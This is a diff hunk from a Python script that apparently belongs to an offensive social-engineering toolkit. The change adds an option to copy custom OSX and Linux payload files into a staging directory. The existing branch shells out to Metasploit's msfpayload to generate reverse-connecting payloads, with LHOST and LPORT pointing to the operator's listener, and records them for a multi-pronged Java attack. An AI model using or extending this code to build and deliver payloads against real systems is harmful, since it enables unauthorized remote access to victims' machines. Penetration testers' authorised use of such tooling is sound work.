@@ -658,18 +658,52 @@ try:
                     port1 = "8082"
                 # deploy nix and linux binaries
                 if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
-                    port2=check_config("LINUX_REVERSE_PORT=")
-                    osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
-                    linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
-                    print_status("Generating OSX payloads through Metasploit...")
-                    subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/mac.bin;chmod 755 %s/mac.bin" % (path,osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                    print_status("Generating Linux payloads through Metasploit...")
-                    subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/nix.bin" % (path,linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                    if multiattack_java == "on":
-                        multiattack.write("OSX="+str(port1)+"\n")
-                        multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
-                        multiattack.write("LINUX="+str(port2)+"\n")
-                        multiattack.write("LINUXPAYLOAD=%s\n" % (linuxpayload))
+
+                    # if we are using a custom linux/osx payload
+                    if check_config("CUSTOM_LINUX_OSX_PAYLOAD=").lower() == "on":
+                        osx_path = raw_input("Enter the path for the custom OSX payload (blank for nothing): ")
+                        lin_path = raw_input("Enter the path for the custom Linux payload (blank for nothing): ")
+                        print_status("Copying custom payloads into proper directory structure.")
+                        # if we didn't specify blank
+                        if osx_path != "":
+                            while 1:
+                                if not os.path.isfile(osx_path):
+                                    print_error("File not found, enter the path again.")
+                                    osx_path = raw_input("Enter the path for the custom OSX payload (blank for nothing): ")
+                                if os.path.isfile(osx_path): break
+
+
+                            if osx_path != "":
+                                # copy the payload
+                                shutil.copyfile(osx_path, setdir + "/mac.bin")
+                    
+                        # if linux payload
+                        if lin_path != "":
+                            while 1:
+                                if not os.path.isfile(lin_path):
+                                    print_error("File not found, enter the path again.")
+                                    lin_path = raw_input("Enter the path for the custom Linux payload (blank for nothing): ")
+                                if os.path.isfile(lin_path): 
+                                        break
+                                    
+                            if lin_path != "":
+                                # copy the payload
+                                shutil.copyfile(lin_path, setdir + "/nix.bin")
+
+
+                    else:
+                        port2=check_config("LINUX_REVERSE_PORT=")
+                        osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
+                        linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
+                        print_status("Generating OSX payloads through Metasploit...")
+                        subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/mac.bin;chmod 755 %s/mac.bin" % (path,osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        print_status("Generating Linux payloads through Metasploit...")
+                        subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/nix.bin" % (path,linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        if multiattack_java == "on":
+                            multiattack.write("OSX="+str(port1)+"\n")
+                            multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
+                            multiattack.write("LINUX="+str(port2)+"\n")
+                            multiattack.write("LINUXPAYLOAD=%s\n" % (linuxpayload))
 
                     osxcheck = check_options("MAC.BIN=")
                     linuxcheck = check_options("NIX.BIN=")
